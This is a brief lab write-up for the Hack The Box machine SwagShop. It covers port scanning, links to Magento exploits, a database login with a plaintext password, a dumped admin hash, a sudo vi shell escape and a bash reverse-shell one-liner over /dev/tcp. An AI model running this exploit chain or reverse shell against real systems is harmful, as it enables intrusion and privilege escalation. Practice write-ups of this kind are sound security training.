---
title: HTB SwagShop
author: kei5uke
draft: true
description: Writeup for HTB SwagShop
tags:
  - linux
  - writeup
---

# Nmap

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA) 
|   256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)
|_  256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Did not follow redirect to http://swagshop.htb/
|_http-favicon: Unknown favicon MD5: 88733EE53676A47FC354A61C32516E82
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# Port80 HTTP

![[HTB SwagShop - image.png]]

- Magento 2014

To get admin dashboard: https://www.exploit-db.com/exploits/37977

To get shell: 

[raw.githubusercontent.com](https://raw.githubusercontent.com/0xBruno/MagentoCE_1.9.0.1_Authenticated_RCE/refs/heads/main/exploit.py)

# Shell ad www-data

DB config

![[HTB SwagShop - image 1.png]]

`mysql -D swagshop -u root -p fMVWh7bDHpgZkyfqQXreTjU9`

Found user from admin_user table

`Haris Swagger : [haris@htbswag.net](mailto:haris@htbswag.net) :  8512c803ecf70d315b7a43a1c8918522:lBHk0AOG0ux8Ac4tcM1sSb1iD5BNnRJp`

Cant crack :(

![[HTB SwagShop - image 2.png]]

`sudo /usr/bin/vi /var/www/html/api.php -c ':shell’`

```
__import__('os').system('/bin/bash -i >& /dev/tcp/localhost/4444 0>&1')
```
